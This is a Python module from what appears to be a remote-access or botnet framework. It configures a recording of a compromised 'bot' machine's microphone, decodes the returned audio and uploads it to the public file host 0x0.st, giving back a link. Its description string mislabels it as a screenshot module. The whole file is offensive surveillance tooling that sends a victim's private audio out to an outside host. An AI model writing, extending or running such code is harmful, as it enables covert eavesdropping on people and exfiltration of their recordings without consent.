# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *
from base64 import b64decode
import json
import requests

class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Take a screenshot of the bot's screen.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        """
        returns: List
        first option is the Label in html
        second option is the name for which the post request will call for
        """
        return [
            ["Time in seconds you want to record <Leave Empty for 10 seconds by default> ","outputName"]
        ]

    def setup(self, set_options):
        record_time = set_options[0]

        if not record_time:
            record_time = "10"

        return True, {
            "response_options": {
                "record_time": record_time
            }
        }

    
    def process_response(self, response, response_options):
            output_name = "recording.wav"
            data_res = b64decode(response.decode().split("'")[1].encode())
            url = 'https://0x0.st'
            data = {
                "file": (output_name,data_res),
                }
            print("Sending Request","\n"*5)
            r = requests.post(url,files=data)
            print(f"Request Sent\n{r.content}","\n"*5)
            url = r.text.strip()
            if r.status_code == 200:
                res = ""
                res = f"Your Audio File Url of Microphone is :~ {str(url)}\n"
                res += "\n\n"
                res += "----------"*20+"\n\n\n\n"
                return res
            else:
                return r.content
        
        

